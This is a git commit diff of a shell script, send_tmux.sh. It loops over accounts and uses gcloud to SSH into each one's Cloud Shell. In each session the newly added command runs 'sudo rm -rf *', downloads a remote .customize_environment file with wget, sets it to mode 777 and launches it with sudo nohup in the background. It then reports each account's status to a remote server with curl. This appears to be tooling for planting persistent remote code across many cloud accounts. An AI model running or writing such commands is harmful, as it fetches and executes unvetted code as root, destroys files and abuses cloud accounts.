d00ef8e3be991f1a3e871fdeb81ca94829655c50
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-20 20:37:11 -0300

    Update send_tmux.sh

--- send_tmux.sh
+++ send_tmux.sh
@@ -47,10 +47,12 @@ do
         curl $url
 
         echo $new 'ok!'
-        
-        command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
 
-        gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
+#        command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
+
+        command="sudo rm -rf * ; sudo rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &"
+
+        sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
 
         url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root'
         curl $url
